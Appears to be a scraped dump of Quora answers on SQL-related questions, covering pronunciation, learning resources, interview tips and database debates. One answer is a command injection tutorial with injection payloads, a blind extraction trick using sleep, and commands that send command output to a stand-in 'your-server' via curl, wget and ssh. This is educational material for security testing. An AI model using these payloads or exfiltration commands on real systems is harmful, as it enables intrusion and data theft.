+He had been a systems programmer for about a year and a half and was only responsible for VTAM (a telecommunications package) which we pronounced as V - tam. That was the extent of his position’s responsibility. He had never done any CICS programming and wasn’t involved with in any way.
+VTAM (Virtual Telecommunications Access Method) was just a small part of what I handled.
+We pronounced it V-tam because everyone else had done so for as long as I can remember and saying V-T-A-M is harder than saying V-tam.
+C-I-C-S just rolls off the tongue, unlike V-T-A-M.
+In that instance I did think that his saying kicks was a sign of inexperience.
+It was, I thought, a wannabee trying to walk the walk and talk the talk.
+Hey, I just realized, your question seems to be that of a wannabee trying to walk the walk and talk the talk.
+As to SQL, everyone I know who has ever even heard of it says S-Q-L.
+By they way, if you don’t use the letters - just how the heck do you pronounce SQL?
+One answer points out that SQL is a shorting of the original name. Did you read that answer?
+Of utmost importance in all areas of computing, is communications - clear, unambiguous communications.
+You use the terms that you know everyone else uses but you have to remain aware that you universe has boundaries and what you do or what you say may be done only in your limited universe.
+If you truly judge someone’s competence in how they refer to various software packages, without taking anything else into consideration -you have a very, very long way to go in computers to become competent.
+692 Views · View 2 Upvoters",Tom Ferral,"If someone pronounces SQL as ""S-Q-L"", do you assume they aren't experienced in it?",SQL
+10,"It’s easier for me to answer this question from two angles.
+Why do we need invoke database operations on the server-side? Why can't we do filters on the client side?
+In the interest of performance, you want to perform as many operations as close to the data layer as possible. Why?
+Most clients, like web browsers, do not have the capacity to handle and reduce full-table scans to aggregates or projections.
+There is not enough network bandwidth to transport a full table on scans where clients perform relational operators on their end.
+Nor can clients, by virtue of being distributed, exploit a common CPU cache hierarchy to reduce operational burden.
+Clients cannot manage their own indexes because they have no awareness of how rows are stored on the server side.
+Clients cannot cache resultsets and share them with each other.
+Doing operations on the client-side defeats the purpose of databases. So, it is absolutely essential for a database to execute operations on the server side and for the client to have some way to interact with it declaratively.
+Why is SQL the most popular language of interaction with databases?
+In the early days of the NoSQL movements, it was a trend to declare that a NoSQL engine could be interacted with only JSON instead of SQL. Programmers, believing that JSON was more intuitive than SQL, seized on this trend.
+Some early NoSQL developers designed this JSON query metalanguage to operate in a strict pipeline and mapped JSON components to a particular stage in the pipeline. The weaknesses of the pipeline approach became apparent over time.
+For instance, if pipelines had a filter stage and aggregate stage, do you decide to do FILTER-THEN-AGGREGATE which is expressed in SQL's WHERE/GROUP BY? Or do you AGGREGATE-THEN-FILTER which is the equivalent of SQL's HAVING? And how do you make a pipeline perform a join for that matter?
+And over time, relational algebra gained popularity over pipelines, and SQL re-gained popularity in the NoSQL world as engineers found that it was already a truly declarative language capable of expressing many operations. Why re-invent the wheel?
+My belief is that SQL is here to stay, and anyone wishing to work with data will be well-served to learn it.
+6.4k Views · View 68 Upvoters",Jennica Pounds,Is learning SQL not worth it anymore?,SQL
+11,".#Tips, tricks for the question: For SQL Unix interview question preparation which website is best
+.
+Below are top 10 hack tips for your job interview, I hope it helps.
+##TOP 10 HACK TIPS FOR YOUR JOB INTERIVEWS
+1. Secret weapon: tell your career stories at your job interview
+You’re prepped and ready to totally nail this job interview. You’ve rehearsed your elevator pitch—in front of the mirror, even. You’ve committed the entire job description to memory. Heck, you even drove a practice route to the interview location to make sure you knew exactly where to park.
+So, when the meeting finally rolls around, you’re feeling cool, calm, and collected. That is, until the interviewer jumps right in with the dreaded, “Tell me about a time when…”
+Suddenly your mouth is dry, your mind is blank, and you have a mental facepalm moment. Why, oh why, didn’t you think to prepare for these types of prompts?
+Yes, those requests for real-world examples—also known as behavioral interview questions—are frustrating. But, they’re also an extremely common part of the interview process.
+Your best bet is to have a few stories prepared and ready to go for your next interview. Here are the six big ones you should make sure to have in your arsenal. They’re general enough that they can be used for a variety of questions, but specific enough that the person asking will feel like he or she’s getting a good, solid, detail-filled response.
+Related materials:
++ Top 10 career stories for your job interviews: 10CareerStories.blogspot . com
++ Free ebook 395 interview questions with
+answers: InterviewQuestions88 .info/2014/12/free-ebook-395-interview-questions-with-answers-pdf.html
+2. Know about the company:
+Spend time to know about the company’s background and various activities of the company. Knowledge about the company will make you look serious for the job. Also if you have time, read about the competitors.
+Know the basic stats on size and state of the company, and try to develop a view on the top 3 strengths and the top 3 weaknesses/issues the company faces. If you can think through and be prepared to articulate how you can reinforce the strengths and help make progress against the issues, then even better.
+Pro Tip:
+• Set up Google News Alerts for the company and industry you are interviewing for. It shall give you timely news alerts and much needed information & talking points! You can also refer to Social media, website, google search etc. to get more information. Also you can search for people/friends on LinkedIn who are already working in the company and talk to them.
+• Search company on Glassdoor. com. I find that there are typically elements of truth to the themes that surface there, and it is a good way to get a feel for what to expect culturally and again this preparation can help to inform your questions
+3. Ask questions
+You should always have some questions for your interviewer to demonstrate your interest in the position. Prepare a minimum of five questions, some which will give you more information about the job and some which delve deeper into the culture and goals of the company.
+Related material:
++ Best 12 questions to ask employers: InterviewQuestions66.blogspot. com
++ InterviewTips365. info/2014/12/free-ebook-82-secrets-to-win-every-job-interviews-pdf.html
+4. Make good first impressions
+A cardinal rule of interviewing is to be polite and offer warm greetings to everyone you meet from the parking attendant to the receptionist to the hiring manager. Employers often are curious how job applicants treat staff members and your job offer could easily be derailed if you’re rude or arrogant to any of the staff. When it’s time for the interview, keep in mind that first impressions the impression interviewers get in the first few seconds of meeting you can make or break an interview.
+Remember that having a positive attitude and expressing enthusiasm for the job and employer are vital in the initial stages of the interview; studies show that hiring managers make critical decisions about job applicants in the first 20 minutes of the interview.
+Related material:
++ Top 35 tips to prepare for your job interview: 35JobInterviewTips.blogspot .com
+5. Structure your answer
+Most people see a job interview as a passive experience where they answer questions and are confident of securing the job if they answer the questions asked correctly. Rather, see an interview as an opportunity to answer or respond to questions following a guide or plan on the subject of interest. Your answers should emphasize how your skills will be of relevance to the company. To improve how to answer questions in the interview, draft 5 points and have both short and long answers to each point. Nevertheless, you are required to pay attention or listen carefully during the interview. Ensure you carry out proper research on the company before an interview to enable you to prepare appropriately for questions the interview is likely to ask.
+Related material:
++ Top 42 common interview questions with
+answers: 42InterviewQuestionsWithAnswers.blogspot .com
+6. Bring examples of your work
+I have been called several times by hiring managers who expressed their delight at some of my candidates who came to the interview session with samples of their work. You also have the opportunity to do this. Make the most of printed words, it shows how prepared you are and this alone might just set you apart from other candidates. Idea: Some candidates take a copy of their most recent written review to the interview. Obviously, you should only do this if your evaluation is outstanding. Perhaps you could come with a graph or a chat that illustrates the actions you took that saved your old company some money or even how you improved their business.
+Always couch your examples with the following line of logic:
+• This was the situation at the time.
+• This is what I did to remedy the situation.
+• My actions yielded these results.
+7. Clarify your ""selling points"" and the reasons you want the job.
+Prepare to go into every interview with three to five key selling points in mind, such as what makes you the best candidate for the position. Have an example of each selling point prepared (""I have good communication skills. For example, I persuaded an entire group to ...""). And be prepared to tell the interviewer why you want that job – including what interests you about it, what rewards it offers that you find valuable, and what abilities it requires that you possess. If an interviewer doesn't think you're really, really interested in the job, he or she won't give you an offer – no matter how good you are!
+8. Dress for Success
+Plan out a wardrobe that fits the organization and its culture, striving for the most professional appearance you can accomplish. Remember that it’s always better to be overdressed than under and to wear clothing that fits and is clean and pressed. Keep accessories and jewelry to a minimum. Try not to smoke or eat right before the interview and if possible, brush your teeth or use mouthwash.
+9. Practice, practice, practice.
+It's one thing to come prepared with a mental answer to a question like, ""Why should we hire you?"" It's another challenge entirely to say it out loud in a confident and convincing way. The first time you try it, you'll sound garbled and confused, no matter how clear your thoughts are in your own mind! Do it another 10 times, and you'll sound a lot smoother and more articulate.
+But you shouldn't do your practicing when you're ""on stage"" with a recruiter; rehearse before you go to the interview. The best way to rehearse? Get two friends and practice interviewing each other in a ""round robin"": one person acts as the observer and the ""interviewee"" gets feedback from both the observer and the ""interviewer."" Go for four or five rounds, switching roles as you go. Another idea (but definitely second-best) is to tape record your answer and then play it back to see where you need to improve. Whatever you do, make sure your practice consists of speaking aloud. Rehearsing your answer in your mind won't cut it.
+10. Thank Interviewer(s) in Person, by Email, or Postal Mail
+Common courtesy and politeness go far in interviewing; thus, the importance of thanking each person who interviews you should come as no surprise. Start the process while at the interview, thanking each person who interviewed you before you leave. Writing thank-you emails or notes shortly after the interview will not get you the job offer, but doing so will certainly give you an edge over any of the other finalists who didn’t bother to send thank-you notes.
+If you have any questions, pls leave your comment below.
+582 Views · View 12 Upvoters",Andrey Ben,"For SQL, Unix interview question preparation which website is best?",SQL
+12,"Hmm.
+I used to start my interviews by asking the candidate to tell me the difference between Union and Union All. A surprising number of SQL “experts” who came for interviews couldn’t answer this.
+I’d roll this up to harder and harder questions. Some of the exotic stuff that other people have answered I wouldn’t have bothered with. I want to know if they can do day-to-day work.
+Most interesting was probably working with the Model Clause in Oracle. I thought it was cool to turn a db table into a mega-spreadsheet, with multi-occupied cells. I wish I had a good use for that tool.
+Hardest to write when I encountered it? I had one bear of a time with what amounted to translating a numeric matrix into a sql pattern and then doing matrix algebra to find connections. Finally figured out how to do it smart rather than straightforward and processing time got down.
+My wife once got in a business class where the teachers seemed to think report queries were easy. She took in one of my hierarchical queries for Oracle that was designed to blow through manufacturing data matching customer order to whatever source was fulfilling it (conditionally it could come from a shop order or a purchase order, so based on the condition it ran one subquery or another) across multiple customer orders that were in flux.
+It’s goal: It would tell you essentially what the consequences were if you had to reroute a part from spares over to the manufacturing side or if you had to do the reverse. Answering the question, “if I take this part will the order it is already set to fulfill have a problem or can we get another one ordered for it in time?”
+It took weeks of iterative development to write and get right. It was worth every minute of effort. Not just to me but financially to the company.
+The query ran over 20 pages of text and she did get to make her point. Just because some report queries are easy doesn’t mean all report queries are easy.
+Some of the coolest queries become a piece of art for those who can read them.
+947 Views · View 1 Upvoter",Scott McNulty,What is the toughest SQL query?,SQL
+13,"I’ve seen newer database languages and they suck. (MDX I’m looking at you.)
+SQL is semantically mature and complete, and it covers every operation that anybody would ever want to do in a database. Considering how few people actually have a disciplined reason for selecting one database technology over another, it doesn’t make much practical sense at all to come up with some superset of SQL.
+For example. Everything new that has been done in cloud storage is basically covered in dialects of SQL in the COPY command. So while Amazon has done some interesting things with
+Also look at the maturation of HDFS which was never really properly a database. Finally you got Pig and then Hive. What’s Hive but applying SQL to Hadoop? A lot of web developers (not database experts) got really excited about document databases they called NoSQL - but these were primarily primative data stores with some (ahem) semi-complete APIs mostly ported to Javascript. Good for superceding LAMP, but not much else. If and when these datastores mature in to full database management systems, they will either port their APIs to multiple languages or they will build a SQL based semantic layer.
+You can be a commercial success in Uganda if you speak Bantu. But if you want to fly a plane out of there and be a commercial success worldwide, you need to speak English. The same is true of real databases. Speak SQL. It’s good for you.
+142 Views · View 1 Upvoter · Answer requested by
+Jacob Lee",Michael David Cobb Bowen,Why is SQL used when it is extremely old fashioned as a database language?,SQL
+14,"Best Online Resources for Learning SQL and Database Concepts
+SQL is one of the most important skill for any programmer be it a Java, C++, PHP or Ruby developer.
+Almost 95% of the Java applications uses relational database in their back-end and almost all web applications uses database.
+From my experience I can say that SQL is easy to learn but difficult to master. You can start writing SQL queries in about an hour or so, but when it comes to write queries to solve real time requirements or for reporting purpose, its not that easy.
+Practicing SQL online on sites like SQLZoo or SQLFiddle and more others will help you to keep yourself up-to-date.
+You can also take help from some good SQL books like:
+Head First SQL (if you are beginner, head first way is one of the best way to learn SQL).
+1. W3Schools – “SQL Tutorial”
+W3Schools claims to be the largest web developer site on the Internet. It provides various tutorials and references on web development languages such as HTML, CSS, JavaScript, PHP, SQL, and JQuery, covering most aspects of web programming.
+Their online SQL Tutorial guides you through syntax and most important statements, keywords, and functions. Short but concrete descriptions and many examples make this tutorial easy to read and understand.
+A distinctive feature is the ability to test queries online. At the start of the tutorial, there is a sample database which you can modify and restore back to its original content at any time. The guide ends with a simple quiz.
+The entire tutorial is available without registration.
+2. Vertabelo Academy
+Vertabelo Academy offers interactive SQL courses, available directly in the browser. You can learn about SQL queries, data management, and table creation.
+The “SQL Queries” course starts with simple queries, progressing through GROUP BY queries to advanced topics like subqueries. You will also find out about the subtle changes between various joining methods, including INNER JOIN, LEFT JOIN, RIGHT JOIN and OUTER JOIN. Finally, you’ll have a chance to test your knowledge in a comprehensive quiz.
+In the “Operating on Data in SQL” course, you will learn how to manage data in relational databases, i.e., how to insert, update, and delete information from a database.
+In the “Creating Tables in SQL” course, you will find out how to manage the structure of a relational database. You’ll learn to create tables and define their various elements, like primary keys, UNIQUE keys, and foreign keys. You will get to know how to use and define constraints. Finally, you will find out how to create views.
+Each course features dozens of interactive exercises with a detailed explanation of the theory behind the lesson, and an interactive console that verifies your solution. After completing all lessons, you can take a final quiz to test your knowledge.
+You can start the course without registration but you will be asked to sign up after completing the first few exercises. You can register with your email address, or your social profiles (Facebook, Google+, Twitter, or GitHub).
+3. Codecademy – “Learn SQL”
+Codecademy is an online platform that offers a wide range of free coding courses in programming languages like HTML, JavaScript, jQuery, PHP, Python, and Ruby. In addition to these courses, Codecademy’s students can learn how to manage data with SQL.
+Like all other courses at Codecademy, “Learn SQL” is free and interactive. It covers the basics of database fundamentals: tables, queries, aggregate functions, constructing advanced database queries and more.
+The course consists of 4 lessons that focus on:
+basic SQL commands to manipulate data stored in relational databases
+the most commonly used SQL commands to query a table in a database
+using SQL to perform calculations during a query
+querying multiple tables using joins
+The user interface of each lesson is divided into three panels. The left one contains a description of the exercise with a brief theoretical introduction. In the center, there’s an interactive SQL command line where the user writes SQL against an SQLite database. The panel on the right features a visual representation of the database schema with the query result.
+After completing a lesson, you can test your knowledge with a quiz, or master your skills with a real-world project to teach you how to apply what you’re learning in a hands-on, practical way. Unfortunately, both quizzes and projects are available only for users who have subscribed to a paid Pro version of Codecademy.
+In order to participate in the course, you need to register using an email address or a Google or Facebook account.
+4. Khan Academy – “Intro to SQL”
+Khan Academy provides its users with micro-lectures in the form of YouTube videos, lots of practice exercises, and a personalized learning dashboard. Combined, these tools empower learners to study at their own pace inside and outside of the classroom.
+Among many courses offered by Khan Academy, you can find a free SQL course called “Intro to SQL: Querying and Managing Data.”
+Each lesson consists of two elements. The window on the left is a video tutorial, while the window on the right shows real-time changes in the database structure and the results of queries performed under the SQLite database. Exercises are supported by documentation and useful hints. After finishing the first part of the course, learners complete a more advanced project.
+The whole course contains 5 parts, starting with SQL fundamentals. It continues with constructing more advanced SQL queries using operators (such as AND/OR, IN, LIKE, etc.) and joins. An ending section called “What to learn next” provides useful tips and links.
+Khan Academy allows users to watch videos without registering; however, after registration (via Facebook, Google, or email) they can ask questions regarding videos and participate in discussions.
+5. SQLZoo
+SQLZoo is a nice free and interactive SQL tutorial developed and maintained by Edinburgh Napier University.
+The course features live interpreters and interactive exercises for multiple types of databases, such asMySQL, PostgreSQL, Oracle, SQL Server, and DB2.
+This site has three major sections: Tutorials, Assessments, and Reference.
+A tutorial is a set of exercises that aims to acquaint you with new topics. You start with SQL basics, then go through nested SELECT statements and aggregate functions (such as COUNT, SUM, or AVG), ending with more advanced JOIN operations. At any time, you can consult the Reference section for background on the appropriate theory, explained with interactive examples.
+After completing each tutorial, you can take a quiz to show how well you understand the topic.
+The Assessments section offers several mini projects; each includes 15 questions of varying levels of difficulty.
+The course is available without registration, however, you can create an account with your email. This is recommended if you want to publish comments or contribute to the site.
+6. Tutorials Point – “Learn SQL”
+Tutorials Point claims to be the web’s largest library of tutorials. Indeed, it offers dozens of online courses in computer engineering, information technology, programming languages, and management.
+If you’re looking to learn SQL or database concepts, you will find several tutorials here, including courses in SQL, MySQL, PostgreSQL, SQLite, DB2, PL/SQL, and others.
+The “Learn SQL” tutorial provides a nice guide to basic SQL, its most useful functions, and more advanced topics. There are plenty of easy-to-understand examples, but no interactive exercises to practice what you have learned.
+It’s worth mentioning that you can download the whole tutorial as a PDF file to get back to it at any time, even when offline.
+7. Udacity – “Intro to Relational Databases”
+Udacity offers interactive online courses aimed at advancing academic and vocational skills. Although Udacity is profit-oriented, some courses are available for free.
+One of its free courses is “Intro to Relational Databases”, which provides the learner with the basics of SQL and database design. Since the course uses examples and programming exercises in Python, you’ll also get to know the Python API. For this reason, Python fundamentals are required. You don’t need any previous database experience since this course is an entry-level introduction to relational databases.
+The course consists of video lessons, and each lesson includes a final quiz. The lessons are divided into four parts:
+Relational Concepts
+SQL queries
+Python DB-API (accessing a relational database from Python code)
+Advanced SQL (joins, normalization)
+The course ends with a project that focuses on building a database-backed Python module to run a game tournament.
+You don’t have to register to preview the course, but if you want to get full access, you must sign up with your email, Google, or Facebook account.
+8. SQL Problems and Solutions
+SQL Problems and Solutions is an interactive textbook which lets you visualize tables and execute queries against a sample database. The tutorial explains the basic concepts and constructs of SQL and provides examples at various levels of expertise.
+Once you get familiar with SQL, you can practice your skills on the sister site “SQL Exercises”. Here you can build and test your SQL DML statements: there are exercises for retrieving and modifying data using the SELECT, INSERT, UPDATE, and DELETE statements.
+You can read the entire textbook without registration, but if you’d like to write your own queries in the interactive SQL console and execute them against sample databases, you’ll need to sign up with your email address.
+9. Tuts+ – “SQL for Beginners”
+Tuts+ offers video courses and written tutorials that teach a wide range of creative and technical skills, including coding. Unlike video courses, all tutorials and articles are completely free. Based around specific projects, they include step-by-step written instructions and screenshots to help you practice and master your skills.
+Among over 20,000 free tutorials, there’s a pretty good one that teaches SQL. In fact, this is more of an article than tutorial. It consists of two parts: “SQL for Beginners” and “SQL for Beginners Part 2.” The first article includes an easy-to-grasp explanation of basic SQL queries, complete with many screenshots. In the second article, users learn about indexes, data types, and some rather more complex query structures.
+Both articles are available without registration.
+10. Essential SQL
+Essential SQL, authored by Kris Wenzel (@sqlkris), is a great place to learn the fundamentals of SQL and database concepts. The course is based on Microsoft SQL Server, which is why the author provides newbie users with a guide on how to get started using this database engine.
+The tutorial presents free tools to get you started, a guide leading you through the setup process, step-by-step explanations of how to download and activate a sample database, and much more. You’ll get to know how to create simple select and sort queries, introduce yourself to SQL Server’s built-in function, learn how to normalize your database, and much more.
+An especially great thing with Essential SQL is that Kris is personally involved in the teaching process. When there are problems or doubts, he strongly encourages readers to contact him.
+A significant drawback of this course is its lack of a structured learning program. It’s more an extensive collection of articles covering a wide range of SQL-related topics than a step-by-step tutorial.
+Most of the articles are available without registration; however, some content requires users to sign up with an email account.
+11. Learn SQL The Hard Way
+12. Udemy – SQL Tutorials
+13. MySQL Tutorial
+14. SQLCourse
+15. Database Journal
+16. Guru99
+17. SQL for Web Nerds
+18. Stanford Database Course
+Recommended SQL Books for Further Reading
+Beginning SQL Queries: From Novice to Professional by Clare Churcherss
+Joe Celko's SQL Puzzles and Answers, Second Edition
+Head First SQL: Your Brain on SQL -- A Learner's Guide
+8.6k Views · View 29 Upvoters · View Sharers",Alex Maison,How do I learn more advanced SQL?,SQL
+15,"TECHNICAL SKILLS
+When you are at the beginning of your career you stress your technical and programming skills. Yes, knowing many languages may indicate your ability to learn. On the other hand if you only used them for a few months each, it may indicate that you are not an expert in any of them. So you need to show about two years in any particular skill to demonstrate sufficient experience.
+For instance, saying that you know XML is not that impressive. Saying you developed a data exchange mechanism for your company may be much more interesting. Or you may be able to show that you have experience in designing ETL routines or building queries for BI reports. That is more descriptive than just saying you used PL/SQL or T/SQL.
+However, programming skills as you pointed out do not distinguish yourself from other junior programmers. So what do you need to do?
+COMMUNICATION SKILLS
+First, you need to realize that your CV is your calling card, your self-promotion marketing material. Dryly listing the systems worked on and the technologies used will not impress employers. Every bullet point should start with a dynamic verb that emphasizes what you brought the table, what you contributed to the project.
+You need to tell stories that highlight your special soft skills as well as hard skills that will help get you a job. What did you do that was a big benefit to the business? How did you solve a problem or save the company money? Showing how well you can write demonstrates better than anything your communication skills. All companies are looking for good communicators as that is a skill often lacking in developers.
+BUSINESS SKILLS
+Definitely describe your knowledge about the business side of your solutions. Often Business Requirement studies document typical motherhood statements. Companies are sorely in need of resources who can gather the “real requirements” that drive the solution. So if you spent time refining the business requirements into more precise data or application requirements, then say so. This opens up the possibility of a future career as someone who analyzes and designs the solution. This could eventually lead you into business, data and/or application architecture. I have worked in all three architectures and have definitely enjoyed it.
+DATA SKILLS
+Figure2: Data Model is more than a Pretty Picture
+In the era of Big Data, the need for data analysts (aka data scientists), data modellers and data architects will increase. If you have helped define or revise databases then show what you contributed. Too many companies are using developers to build their databases. Unfortunately, developers are not very good at it. They follow the “Just Build It” approach. Too many companies are not insisting on data models to design their databases using proper standards and best practises — they don’t even use normalization. Please see the articles on SQL Skills Missing in Developers and Data Modelling – the Why that may give you a few ideas.
+DATA MANAGEMENT SKILLS
+Even in the current environment, the lack of data management is appalling. Please see the article on Data Management Approach that may give you a few ideas.
+NEW SKILLS
+You should be using your current job to learn the skills that could be useful in your next job. So if any of the above skills are of interest to you, take leadership, get involved and initiate some aspect that could improve your project. Take courses and apply what you learned. The key is not the courses, the key is applying these skills and adding them to your project descriptions in your CV.
+Regards Terra Encounters
+157 Views · View 1 Upvoter",George Mitchell,"Which programming, SQL, or database competencies do I distinguish myself from other junior programmers?",SQL
+16,"It is only you that has decided it is old-fashioned.
+Sure, it’s old, but so is Linux, it’s a copy of UNIX, which is really pretty ancient now.
+You’re asking why people use SQL and invented a reason why they should not.
+The reason we use SQL is because it works, and that is what the major RDBMS use.
+I’m not saying SQL is great, or that it couldn’t do with a bit of work, but it’s completely fit for purpose. Is it old fashioned? I don’t know, what would a “new fashioned” query language look like? Probably some JSON balls-up I expect.
+The problem with replacing older technologies is that we’re every bit as likely to replace it with something worse as something better.
+22k Views · View 150 Upvoters",Garry Taylor,Why is SQL used when it is extremely old fashioned as a database language?,SQL
+17,"There is no solution. Even a vanilla HTML table with one million rows would be a problem.
+And what the hell. I ran a test. I was surprised! I’m running a 2015 Macbook Pro in Firefox 62 and was expecting this to crash the tab.
+<script>
+   let table = ""<table><tbody>"";
+   let targetElement = document.getElementById(""main"");
+   for (let i = 0; i < 1000000; i++) {
+     table += ""<tr><td>this is a row</td></tr>""
+   };
+   table += ""</tbody></table>"";
+   targetElement.innerHTML=table;
+ </script>
+It took about ten seconds to render, and the table contents don’t appear instantly on scroll, indicating that the browser is doing some serious optimizations to make this work, but it eventually displayed!
+The raw strings are about 40MB. As you can see in the graph below, the vast majority of time is spent in pure layout. Only about 2.7 seconds are actually spent building a table in memory with a million rows. There’s no point in optimizing your JS when your layout is so expensive.
+Furthermore, the actual Firefox instance that loaded this page took up over 2GB of memory!
+Long story short, there is no such thing as a fast table with a million rows, especially in a framework. Your best course of action is to hold the million rows as a string, array, or object and display as needed.
+2.8k Views · View 9 Upvoters",Aaron Martin-Colby,What is the best solution to create a very fast angular table that holds 1 million rows?,SQL
+18,"There are several reasons:
+1. SQL is a standard and standards are very hard to change. Especially when they work and data is incredibly ""sticky"".
+2. SQL is declarative: compare a SQL statement producing a report with a Java or even Python program. Then show it to a none-engineer.
+3. SQL is very forgiving - something ppl usually don't think about. Database optimizers as well as the sheer computing powers ""forgives"" badly written SQL statements.
+4. SQL is run by databases and databases take time to mature. There are awesome database products that run SQL.
+22.3k Views · View 93 Upvoters",Nikita Shamgunov,Why are we still writing SQL much like we are no longer writing C and have moved beyond it to higher level languages?,SQL
+19,"So, my personal feeling (which is not always shared by others…including hiring managers) is that the most important aspects of data analysis and data science are non-technical.
+Having really strong problem solving skills, the ability and awareness to recognize when things are not as they should be and the drive, determination and creativity to dig deeper and figure things out are central to doing good work.
+The other thing that is hugely important is the ability to communicate well. You need to ask questions of the data stewards, domain experts and your customers (whether you work with them or are consulting) and then use data meaningfully to address their needs.
+This might mean summary tables for high-level executive or accountant who is used to seeing these things. Or it might mean building a series of charts and tables into a report or dashboard with written copy that tells a story.
+The key here is understanding the business questions, clarifying and discussing them and then providing clear and unmistakable stories from your exploration.
+How much hard code do you need to get there? That can vary a lot from job to job. The bigger the data the more you will need some form of code to interact with systems optimized for the scale of your data. At many companies there are tools to help you deal with data too, such as Alteryx, which reduce or eliminate the need to code.
+My suggestions to someone starting out. Know SQL! Take a course in it online (there are a ton of free MOOCs out there) and get to know it pretty well. You can build your own tables using free datasets and work on building queries and joins. It is not difficult, but much of it fades if you are not using it regularly. So, build a habit of working in SQL for 10- 20 minutes per day while you are searching for a job to stay fresh and relevant.
+As for code, it probably does not matter at this point whether you know Python or R. They are equally good for inferential and predictive work, though you get more depth in regression summaries from R and more deployable models from Python.
+I would pick one and only one until you have cause to learn the other. Spend time becoming proficient in the language you choose, but focus on three things.
+Be able to deftly manipulate data they way you might in excel using pivots, grouping data, selecting and filtering. This is very important it is how you will prepare your data for analysis!
+Be able to use traditional inferential statistics properly, understand confidence intervals and know how to interpret errors. As David said, having the ability to run a linear regression would go a long way too.
+Be able to make clear, correct and interpretable charts, graphs and tables using your languages plotting tools. Be able to control the size, scale, fonts, labels and color of elements.
+If you can work at this depth, then the key to getting a job as an analyst is understanding the business domain and the problems your division will address with data.
+309 Views · View 4 Upvoters",Bethany Poulin,"How much SQL, Python, and R training does a person need to do a data analyst job properly?",SQL
+20,"As they said your are probably new in web development. Same here.
+If you asked this question it probably means you haven’t learned the basic concepts yet.
+However I can tell you this:
+Web development is diveded into:
+-Front End Development (what you see on the website, the graphic part)
+-Back End Development(whatever is related with the server, database, applications..)
+Now… try to understand what you want to start with first
+(in my case I picked front end development)
+LANGUAGES/CONCEPTS TO LEARN FOR FRONT END DEVELOPMENT:
+-HTML5
+-CSS3
+-Javascript
+—————(MAINLY THESE 3 ABOVE)——-
+-DOM concepts
+-JQuery
+-Bootstrap(bootstrap is a framework.. It makes you save time thanks to specific classes already created which merge css and javascript to help you build a responsive (mobile-friendly) website. (I personally tried to use bootstrap but I got sick of it straight away cause of the limits it imposes)
+LANGUAGES TO LEARN FOR BACK END DEVELOPMENT:
+-JavaScript (can be used as well in back end if I’m not wrong)
+-PHP
+-mySQL
+-JAVA
+the list could go on with many other things ANGULAR, REACT…..
+you need first to decide where to start from
+Good Luck!!
+929 Views · View 1 Upvoter",Andrea Penza,"How can I link Node.js, HTML, and MySQL and display the data?",SQL
+21,"A command injection is a class of vulnerabilities where the attacker can control one or multiple commands that are being executed on a system. One of the best ways to detect such vulnerabilities is by trying to execute a sleep command (sleep 5) and watch the Round Trip Time (RTT) of a request. Let’s say the system usually responds in about 500ms, then the injection is successful if it takes 5,500ms (or any multiple of 5, but at least 5 seconds longer than when you’re not injecting the command) when you're trying to inject the command. To make sure it’s not a false-positive, send sleep commands with a different amount of seconds (sleep 3, sleep 10, etc). If the RTT correlates with the seconds you put in, it’s very likely you found a command injection vulnerability. Not every command injection can be exploited the same way, so try different payloads. Here’s a few:
+; sleep 5
+&& sleep 5 && echo
+| sleep 5 && echo
+‘ && sleep 5 && echo
+“ && sleep 5 && echo
+$(sleep 5)
+The next step is to figure out if it’s a blind command injection or a generic command injection. The difference between the two, is that a blind command injection doesn’t return the output of the command in the response. A generic command injection would return the output of the executes command(s) in the response. The sleep command is often a good proof of concept. However, if you need more proof, execute id or whoami and use the output as additional proof. Important: a lot of companies don’t appreciate you snooping around on their systems. Before exploiting the vulnerability to pivot into something else, ask permission to the company.
+It’s a little trickier to exploit a blind command injection, but, in most cases, it can be done. The goal is to determine the output of a command with the sleep (or similar) command. The trick for this, is to pass something you guess as argument to the sleep command. Here’s an example: sleep $(whoami | cut -c 1 | tr a 5). Let’s analyze this for a moment.
+It’s executing the whoami command. Let’s assume it returns user.
+It’ll take that output and pass it to cut -c 1. This will take the first character of user, which is the character u.
+It passes it to tr a 5, which will replace the character a with a 5 in the output of the cut command (u).
+The output of the tr command is then passed to the sleep command, resulting in sleep u being executed. This will immediately error, since sleep can only take a number as first argument. The goal is then to iterate over the characters with the tr command. Once you execute sleep $(whoami | cut -c 1 | tr u 5), the RTT of the request will take 5 seconds longer to complete.
+Once you guessed a character, increase the number you pass to the cut -c command, and repeat.
+If the timeout of the server is relatively high, you can speed up the process by passing multiple tr commands with different timeouts: sleep $(whoami | cut -c 1 | tr a 5 | tr b 10 | tr c 15 | tr d 20 | tr e 25). You can repeat this as long as the server doesn’t timeout before returning the response. If you know the output is in a certain language, you could optimize the first characters you’re brute forcing based on the language’s character frequency. Here’s one for English: Frequency analysis - Wikipedia.
+The other way to exploit a blind command injection, is to send the output to a server you control. This will not always work because some systems might have outbound connections blocked. In that case, you’re stuck the the previous example. But you should always give it a try. First, see if any of the following commands exists, since it makes it a lot easier:
+curl -h && sleep 5
+wget -h && sleep 5
+ssh -V && sleep 5
+telnet && sleep 5
+If any of those commands increase the RTT by at least 5 seconds, the command exists. Then, you can use any of those commands to send the output of a command to your server, like this:
+whoami | curl http://your-server -d @- (look in the POST request body for the output)
+wget http://your-server/$(whoami) (look in the request URI for the output)
+export C=whoami | ssh user@your-server (set up the user account on your-server to authenticate without a password and log every command being executed)
+Here’s another thing you could try: in case the system is a web server, try writing the output to a file that’s accessible from the outside. For example, if the current user can write in /var/www, and that’s where the web server’s files are being served from, you could run whoami > /var/www/output. Then simply download the output of the result from http://the-server/output. You could run a port scan on the server to see which ports are opened. For every port, see if there’s a way to download the output through it.
+Happy hacking!
+3.1k Views · View 37 Upvoters · View Sharers",Jobert Abma,What is command injection and how does it work?,SQL
+22,"The license price is only part of the Total cost of ownership of any large product or system.  Other costs include training or retraining, conversion of applications and tools, etc.  Large MS-SQL shops have decades of training and software engineering invested in MS-SQL, and getting them to switch to a completely new data manager (of whatever kind) is a hugely expensive and risky undertaking, which would only be attempted if there were huge rewards for the organization.
+
+Saving a few thousand or a few hundred thousand per year in license fees would not be worth the risk by itself for most of these organizations.
+
+Add to that the fact that PostgreSQL is primarily a Unix/Linux data manager and MS-SQL shops will be Windows shops with deep skills in that environment, and you have a very unfavorable scenario for a large-scale conversion.
+20.1k Views · View 78 Upvoters",Greg Kemnitz,"Why do companies pay for Microsoft SQL Server, when PostgreSQL costs less and has more features?",SQL
+23,"Sure. As are other flavors of MySQL.
